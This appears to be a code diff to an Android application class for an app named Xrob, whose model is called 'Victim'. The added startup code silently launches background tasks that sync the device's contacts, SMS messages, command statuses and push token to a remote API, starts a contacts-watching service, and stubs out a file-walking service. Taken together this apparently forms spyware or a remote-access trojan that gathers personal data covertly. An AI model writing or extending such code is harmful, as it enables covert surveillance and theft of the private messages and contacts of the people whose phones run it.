@@ -2,7 +2,9 @@ package com.theah64.xrob.utils;
 
 import android.app.Application;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
+import android.util.Log;
 
 import com.nostra13.universalimageloader.cache.disc.naming.Md5FileNameGenerator;
 import com.nostra13.universalimageloader.core.DisplayImageOptions;
@@ -10,8 +12,18 @@ import com.nostra13.universalimageloader.core.ImageLoader;
 import com.nostra13.universalimageloader.core.ImageLoaderConfiguration;
 import com.nostra13.universalimageloader.core.assist.ImageScaleType;
 import com.nostra13.universalimageloader.core.assist.QueueProcessingType;
+import com.theah64.xrob.MainActivity;
 import com.theah64.xrob.R;
+import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
+import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.asynctasks.FCMSynchronizer;
+import com.theah64.xrob.asynctasks.MessagesSynchronizer;
+import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
+import com.theah64.xrob.database.BaseTable;
+import com.theah64.xrob.database.Messages;
 import com.theah64.xrob.models.Victim;
+import com.theah64.xrob.services.ContactsWatcherService;
+import com.theah64.xrob.services.FileWalkerService;
 
 import org.acra.ACRA;
 import org.acra.ReportField;
@@ -50,6 +62,7 @@ public class Xrob extends Application {
     public static final String DATA_TYPE_COMMAND_STATUSES = "command_statuses";
     public static final String DATA_TYPE_FILES = "files";
     public static final String DATA_TYPE_MESSAGES = "messages";
+    private static final String X = Xrob.class.getSimpleName();
 
     private static void initImageLoader(final Context context) {
 
@@ -78,12 +91,44 @@ public class Xrob extends Application {
     @Override
     protected void attachBaseContext(Context base) {
         super.attachBaseContext(base);
+        Log.d(X, "App base context attached");
         ACRA.init(this);
     }
 
     @Override
     public void onCreate() {
         super.onCreate();
+
+        Log.i(X, "Application started");
+
         initImageLoader(this);
+
+        //Simply igniting the database
+        Messages.getInstance(this).getReadableDatabase();
+
+        Log.d(X, "Starting contact sync... 1");
+        new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
+            @Override
+            public void onReadyToRequest(String apiKey) {
+                Log.d(X, "Starting contact sync... 2");
+                Xrob.doMainTasks(Xrob.this, apiKey);
+            }
+
+            @Override
+            public void onFailed(String reason) {
+                Log.e(X, "Error : " + reason);
+            }
+        });
+
+        startService(new Intent(this, ContactsWatcherService.class));
+        //TODO: TO BE TURNED ON startService(new Intent(this, FileWalkerService.class));
+    }
+
+    public static void doMainTasks(final Context context, final String apiKey) {
+        new ContactsSynchronizer(context, apiKey).execute();
+        new CommandStatusesSynchronizer(context, apiKey).execute();
+        new FCMSynchronizer(context, apiKey).execute();
+        new MessagesSynchronizer(context, apiKey).execute();
+        new PendingDeliverySynchronizer(context, apiKey).execute();
     }
 }
